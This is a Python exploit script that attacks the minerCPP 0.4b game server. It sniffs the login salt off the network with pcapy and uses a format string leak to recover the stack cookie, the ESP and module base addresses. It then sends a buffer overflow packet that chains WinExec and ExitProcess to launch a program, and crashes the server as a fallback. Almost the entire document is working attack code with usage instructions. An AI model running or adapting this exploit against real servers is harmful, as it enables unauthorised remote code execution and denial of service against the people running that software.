minerCPP 0.4b Remote BOF+Format String Attack Exploit
=====================================================


#!/usr/bin/env python
#minerCPP 0.4b Remote BOF+Format String Attack Exploit
#Software Link: http://sourceforge.net/projects/minercpp/
#Author: l3D
#Sites: http://xraysecurity.blogspot.com, http://nullbyte.org.il
#IRC: irc://irc.nix.co.il
#Email: pupipup33@gmail.com
#Tested on Windows 7
 
#In order to make this exploit work you should sniff the salt first.
#It&#039;s sent by the software to www.minecraft.net
#You can find it in the POST data (salt=12345 for instance).
#I added a part that sniffs it automatically using pcapy.
#Furthermore, in a real attack it can be simply brute
#forced (it&#039;s only rand()). I didn&#039;t add this part in
 
#The EAX can be influenced and the stack too.
#However, there is a stack cookie that
#There are no SEH nor vtable overwritings.
 
#So what can we do?...
#I found a format string attack vulnerability
#which lets us calculate the master cookie
#and get the ESP of the current thread.
#Unfortunately, the BOF is in another
#thread, so the ESP we&#039;ve got may not match
#the ESP we need, what makes this exploit unstable.
 
#Code execution worked to me 10 out of 50 times.
 
from socket import *
from time import sleep
import pcapy, hashlib, re, struct, os, sys
 
print &#039;minerCPP 0.4b Remote BOF+Format String Attack by l3D (pupipup33@gmail.com)\n&#039;
 
if len(sys.argv) < 3:
    print &#039;Usage: python %s <host> <port> [salt]&#039; % sys.argv[0]
    print &#039;If salt is not specified, the exploit sniffs it automatically.&#039;
 
if len(sys.argv) > 3:
    salt=sys.argv[3]
else:
    dev=pcapy.lookupdev()
    cap=pcapy.open_live(dev, 1024, False, 0)
    cap.setfilter("dst 69.175.14.242 and dst port 80")
    data=cap.next()[1]
    while 1:
        salt=re.findall(r&#039;salt=(\d+)&#039;, data)
        if salt:
            salt=salt[0]
            break
        data=cap.next()[1]
 
host=sys.argv[1]
port=int(sys.argv[2])
 
exp=re.compile(r&#039;0X([0-9A-F]+)&#039;)
 
def md5_calc(input):
    o=hashlib.md5(input)
    output=o.hexdigest()
    del o
    return output
 
def pack_login(nick, x):
    login=&#039;\x00\x07&#039;
    if x:
        nick_hash=md5_calc(salt+nick)
        nick=nick.ljust(64)
        return login+nick+nick_hash
    else:
        return login+nick+&#039;\x20&#039;
 
def pack_msg(nick, x):
    msg=&#039;\x0d\x7e&#039;
    if x:
        content=&#039;/pinfo %s &#039; % nick
        content=content.ljust(64, &#039;A&#039;)
    else:
        content=&#039;/pinfo &#039;+nick
        content=content.ljust(64)
    return msg+content
 
def send_and_run(packet):
    sock=socket(AF_INET, SOCK_STREAM)
    sock.connect((host, port))
    sock.send(packet)
    sleep(1)
    sock.close()
    del sock
 
sleep(2)
 
##############################################################################################
 
print &#039;[1] Stage 1: Cookie and KERNELBASE.dll ImageBase Getting&#039;
nick=&#039;%s.%#X.%#X&#039;
trys=0
packet=pack_msg(nick, True)
 
try:
    sock=socket(AF_INET, SOCK_STREAM)
    sock.connect((host, port))
    sock.send(pack_login(nick, True))
except:
    exit(&#039;[-] ERROR: Sockets error.&#039;)
 
data=sock.recv(2048)
while data:
    if data[0]==&#039;\x00&#039;:
        print &#039;[+] Logged in successfuly!&#039;
        sock.send(packet)
    if data[0]==&#039;\x0e&#039;:
        sock.close()
        exit(&#039;[-] ERROR: Wrong salt.&#039;)
    if data.startswith(&#039;\x0d\x00&e&#039;) and &#039; is a &7&#039; in data:
        print &#039;[+] Data has been recieved!&#039;
        nums=[int(i, 16) for i in exp.findall(data[4:])]
        if nums:
            data=data[4:data.find(&#039;.0X&#039;)]
            if len(data)<8:
                if trys < 20:
                    print &#039;[!] Data is too short, trying again...&#039;
                    trys+=1
                    sleep(1)
                    sock.send(packet)
                else:
                    print &#039;[-] ERROR: Too much trys. DoSing...&#039;
                    sock.close()
                    sleep(1)
                    send_and_run(pack_login(&#039;A&#039;*128, False))
                    exit()
            else:
                esp=nums[1]-0xf0
                kernelbase, xored_esp=struct.unpack(&#039;2L&#039;, data)
                cookie=xored_esp^esp
                kernelbase-=0x1671
                print &#039;[+] Stage 1 completed.&#039;
                break
        else:
            sock.close()
            exit(&#039;[-] ERROR: addresses couldn\&#039;t be found.&#039;)
    data=sock.recv(2048)
 
sock.close()
del sock
print
sleep(2)
 
##############################################################################################
 
print &#039;[2] Stage 2: minerCPP.exe and kernel32.dll ImageBases Getting&#039;
nick=&#039;%#X.%#X.%s&#039;
packet=pack_msg(nick, False)
 
try:
    sock=socket(AF_INET, SOCK_STREAM)
    sock.connect((host, port))
    sock.send(pack_login(nick, True))
except:
    exit(&#039;[-] ERROR: Sockets error.&#039;)
 
data=sock.recv(2048)
while data:
    if data[0]==&#039;\x00&#039;:
        print &#039;[+] Logged in successfuly!&#039;
        sock.send(packet)
    if data.startswith(&#039;\x0d\x00&e&#039;) and &#039; is a &7&#039; in data:
        print &#039;[+] Data has been recieved!&#039;
        data=data[4:data.find(&#039; is a &7&#039;)]
        data=exp.sub(&#039;&#039;, data, 2)[2:10]
        if len(data)==7:
            data+=&#039;\0&#039;
        if len(data) < 8:
            sock.close()
            exit(&#039;[-] Data is too short, it can be because one of the adresses contains nullbyte...&#039;)
        else:
            kernel32, minerCPP=struct.unpack(&#039;2L&#039;, data)
            kernel32-=0x4ef88
            minerCPP-=0x5621
            print &#039;[+] Stage 2 completed.&#039;
            break
    data=sock.recv(2048)
 
sock.close()
del sock
print
 
##############################################################################################
 
print &#039;[~] Analyzed data:&#039;
print &#039;[+] ESP: 0x%08x&#039; % esp
print &#039;[+] Cookie: 0x%08x&#039; % cookie
print &#039;[+] KERNELBASE.dll: 0x%08x&#039; % kernelbase
print &#039;[+] kernel32.dll: 0x%08x&#039; % kernel32
print &#039;[+] minerCPP.exe: 0x%08x&#039; % minerCPP
print
sleep(2)
 
##############################################################################################
 
print &#039;[3] Stage 3: Buffer Overflow&#039;
 
esp+=0x50
winexec=struct.pack(&#039;L&#039;, kernel32+0x8e76d)
exitprocess=struct.pack(&#039;L&#039;, kernel32+0x52aef)
calc=struct.pack(&#039;L&#039;, esp+0x98)
 
junk=&#039;A&#039;*(64-len(salt))
xored_esp=struct.pack(&#039;L&#039;, esp^cookie)
ret=winexec #jump to WinExec @ kernel32.dll
ret+=&#039;JUNK&#039;
ret+=&#039;\x10\x01\x01\x10&#039; #readable address @ zlib1.dll
ret+=exitprocess #jump to ExitProcess @ kernel32.dll
ret+=calc #the place of the string in the stack
ret+=&#039;\x01\xFF\xFF\xFF&#039;
ret+=&#039;JUNK&#039;
ret+=&#039;\xFF\xFF\xFF\xFF&#039; #exit code -1
ret+=&#039;calc&#039; #a program to execute
 
packet=pack_login(junk+xored_esp+ret, False)
 
send_and_run(packet)
print &#039;[+] Packet has been sent. The server should be DoSed or a code should be executed.&#039;



